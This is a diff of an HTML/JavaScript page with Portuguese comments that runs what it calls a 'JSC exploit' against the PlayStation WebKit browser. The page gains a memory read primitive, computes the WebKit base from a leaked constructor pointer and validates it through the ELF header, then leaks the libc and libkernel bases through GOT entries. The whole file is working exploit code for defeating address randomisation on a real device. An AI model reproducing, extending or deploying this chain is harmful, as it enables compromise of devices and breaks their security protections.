@@ -54,26 +54,19 @@ h1{font-size:16px;color:#00c8ff;letter-spacing:3px;text-transform:uppercase;marg
 </div>
 
 <!-- ════════════════════════════════════════════════════════════════
-     ES MODULE INLINE — importa tudo diretamente (padrão slopkit)
-     NÃO use <script src=""> para módulos ES6!
+     CARREGA OFFSETS GLOBALMENTE (padrão slopkit — NÃO é module)
+     O 13.52.js define OFFSET_wk_host_constructor_candidates etc.
+     como variáveis globais, acessíveis pelo module abaixo.
      ════════════════════════════════════════════════════════════════ -->
+<script src="./13.52.js"></script>
+
+<!-- ES Module: importa int64, core, mem -->
 <script type="module">
 import { int64 }              from './resources/int64.js';
 import { establishPrimitive } from './resources/core.js?v=10';
 import { installWindowP }     from './resources/mem.js';
 
-// Carrega offsets dinamicamente (padrão slopkit)
-const fwMatch = /PlayStation 4\/(\d+\.\d+)/.exec(navigator.userAgent);
-const fwStr   = fwMatch ? fwMatch[1] : '';
-
-let offsets = null;
-try {
-  offsets = await import(`./${fwStr}.js`);
-} catch(e) {
-  log(`[-] Falha ao carregar offsets ${fwStr}.js: ${e.message}`, 'le');
-}
-
-/* ─── UI helpers ─────────────────────────────────────────── */
+/* ─── UI ─────────────────────────────────────────── */
 const $con = document.getElementById('con');
 const $dot = document.getElementById('dot');
 const $st  = document.getElementById('st');
@@ -96,20 +89,18 @@ function setCard(id, val) {
   if (el) { el.textContent = val; el.style.color = '#00ff88'; }
 }
 
-/* ─── int64 helpers ─────────────────────────────────────── */
+/* ─── int64 helpers ──────────────────────────────── */
 function i64n(a) { return a.hi * 0x100000000 + a.low; }
 function n64(n) {
   const hi = Math.floor(n / 0x100000000) >>> 0;
   const lo = (n - hi * 0x100000000) >>> 0;
   return new int64(lo, hi);
 }
-function validPtr(a) { return a.hi > 0 && a.hi <= 0xFF && a.low > 0; }
 
-/* ─── MAIN: leak de bases (método slopkit) ──────────────── */
+/* ─── MAIN: leak de bases (método slopkit) ─────── */
 async function main(p) {
   logH('LEAK DE BASES');
 
-  // Verifica __ps5NativeCtor
   const ctorRaw = globalThis.__ps5NativeCtor;
   if (typeof ctorRaw !== 'number' || ctorRaw <= 0x100000000) {
     log('[-] __ps5NativeCtor não disponível', 'le');
@@ -121,23 +112,28 @@ async function main(p) {
   setCard('c-ct', '0x' + ctorPtr.toString());
   document.getElementById('cards').classList.add('v');
 
-  // Calcula base via host constructor candidates (método slopkit)
+  // Acessa offsets globais definidos pelo 13.52.js (script src)
+  const candidates = globalThis.OFFSET_wk_host_constructor_candidates;
+  if (!candidates || !candidates.length) {
+    log('[-] OFFSET_wk_host_constructor_candidates não definido', 'le');
+    log('    Verifique se 13.52.js foi carregado antes deste module', 'lw');
+    setStatus('Falha: offsets não carregados', 'e');
+    return;
+  }
+
   let webkitBase = null;
   let matchedCandidate = null;
 
-  if (offsets && offsets.OFFSET_wk_host_constructor_candidates) {
-    for (const hc of offsets.OFFSET_wk_host_constructor_candidates) {
-      if (hc === 0x00000000) continue;
-      const wb = ctorRaw - hc;
-      log(`  Testando candidate 0x${hc.toString(16)} => base=0x${wb.toString(16)}`, 'ld');
+  for (const hc of candidates) {
+    if (hc === 0x00000000) continue;
+    const wb = ctorRaw - hc;
+    log(`  candidate 0x${hc.toString(16)} => base=0x${wb.toString(16)}`, 'ld');
 
-      // Validação: range userland + page aligned
-      if (wb >= 0x800000000 && wb < 0x900000000 && wb % 0x4000 === 0) {
-        webkitBase = n64(wb);
-        matchedCandidate = hc;
-        log(`[+] Base validada! candidate=0x${hc.toString(16)}`, 'lo');
-        break;
-      }
+    if (wb >= 0x800000000 && wb < 0x900000000 && wb % 0x4000 === 0) {
+      webkitBase = n64(wb);
+      matchedCandidate = hc;
+      log(`[+] Base validada! candidate=0x${hc.toString(16)}`, 'lo');
+      break;
     }
   }
 
@@ -155,54 +151,57 @@ async function main(p) {
   try {
     const magic = p.read4(webkitBase);
     if (magic === 0x464C457F) {
-      log('[+] ELF magic confirmado no base ✓', 'lo');
+      log('[+] ELF magic confirmado ✓', 'lo');
     } else {
-      log(`[!] ELF magic inesperado: 0x${magic.toString(16)} (esperado 0x464C457F)`, 'lw');
-      log('    O offset pode estar ligeiramente errado — tente ajustar', 'lw');
+      log(`[!] ELF magic: 0x${magic.toString(16)} (esperado 0x464C457F)`, 'lw');
     }
   } catch(_) {
-    log('[!] Não conseguiu ler ELF magic — offset pode estar errado', 'lw');
+    log('[!] Não conseguiu ler ELF magic', 'lw');
   }
 
-  // Leak libs via GOT (se offsets disponíveis)
-  if (offsets.OFFSET_wk___stack_chk_guard_import && offsets.OFFSET_lk___stack_chk_guard) {
+  // Leak libs via GOT (se offsets disponíveis globalmente)
+  const wk_memset = globalThis.OFFSET_wk_memset_import;
+  const lc_memset = globalThis.OFFSET_lc_memset;
+  if (wk_memset && lc_memset) {
     try {
-      const libKernelBase = p.read8(webkitBase.add32(offsets.OFFSET_wk___stack_chk_guard_import));
-      libKernelBase.sub32inplace(offsets.OFFSET_lk___stack_chk_guard);
-      log('[+] libKernelBase: 0x' + libKernelBase.toString(), 'lo');
-      setCard('c-lk', '0x' + libKernelBase.toString());
+      const lcBase = p.read8(webkitBase.add32(wk_memset));
+      lcBase.sub32inplace(lc_memset);
+      log('[+] libc: 0x' + lcBase.toString(), 'lo');
+      setCard('c-lc', '0x' + lcBase.toString());
     } catch(e) {
-      log('[-] Falha ao leak libkernel: ' + e.message, 'lw');
+      log('[-] libc: ' + e.message, 'lw');
     }
   }
 
-  if (offsets.OFFSET_wk_memset_import && offsets.OFFSET_lc_memset) {
+  const wk_guard = globalThis.OFFSET_wk___stack_chk_guard_import;
+  const lk_guard = globalThis.OFFSET_lk___stack_chk_guard;
+  if (wk_guard && lk_guard) {
     try {
-      const libSceLibcInternalBase = p.read8(webkitBase.add32(offsets.OFFSET_wk_memset_import));
-      libSceLibcInternalBase.sub32inplace(offsets.OFFSET_lc_memset);
-      log('[+] libcBase: 0x' + libSceLibcInternalBase.toString(), 'lo');
-      setCard('c-lc', '0x' + libSceLibcInternalBase.toString());
+      const lkBase = p.read8(webkitBase.add32(wk_guard));
+      lkBase.sub32inplace(lk_guard);
+      log('[+] libkernel: 0x' + lkBase.toString(), 'lo');
+      setCard('c-lk', '0x' + lkBase.toString());
     } catch(e) {
-      log('[-] Falha ao leak libc: ' + e.message, 'lw');
+      log('[-] libkernel: ' + e.message, 'lw');
     }
   }
 
-  // Mostra constants para hardcode
+  // Mostra constants
   const baseN = i64n(webkitBase);
   const ctorRva = i64n(ctorPtr) - baseN;
   log('', 'li');
-  log('// ═══ HARDCODE CONSTANTS (copie para 13.52.js) ═══', 'lo');
+  log('// HARDCODE CONSTANTS:', 'lo');
   log(`const WEBKIT_CTOR_RVA = 0x${ctorRva.toString(16).toUpperCase()};`, 'la');
-  log('// const webkitBase = __ps5NativeCtor - WEBKIT_CTOR_RVA;', 'ld');
 
   setStatus('Bases encontradas ✓', 'ok');
   globalThis._exploit = { webkitBase, ctorPtr };
 }
 
-/* ─── BOOT ──────────────────────────────────────────────── */
+/* ─── BOOT ─────────────────────────────────────── */
 (async () => {
   log(`UA: ${navigator.userAgent.slice(0,80)}`, 'ld');
-  log(`Firmware: ${fwStr || 'desconhecido'}`, 'li');
+  const fwMatch = /PlayStation 4\/(\d+\.\d+)/.exec(navigator.userAgent);
+  log(`Firmware: ${fwMatch ? fwMatch[1] : 'desconhecido'}`, 'li');
   log('', 'li');
 
   setStatus('Executando exploit JSC...', 'r');
@@ -212,11 +211,11 @@ async function main(p) {
   try {
     carrier = await establishPrimitive({
       onEvent(tag, det, att) {
-        const verbose = ['PAIR-REPROVED','PAIR-COMMIT','PAIR-WIDENED','PAIR-CELLS',
+        const v = ['PAIR-REPROVED','PAIR-COMMIT','PAIR-WIDENED','PAIR-CELLS',
           'PAIR-IDENTITY-MAIN','PAIR-IDENTITY-WORKER','PAIR-MAIN-RECORD','PAIR-RELEASE'];
-        if (verbose.includes(tag)) { log('  ' + tag + ': ' + det, 'ld'); return; }
-        const isOk = tag.includes('UP') || tag.includes('OK');
-        log('[' + tag + '] ' + det, isOk ? 'lo' : 'li');
+        if (v.includes(tag)) { log('  ' + tag + ': ' + det, 'ld'); return; }
+        const ok = tag.includes('UP') || tag.includes('OK');
+        log('[' + tag + '] ' + det, ok ? 'lo' : 'li');
       },
       maxAttempts: 0
     });
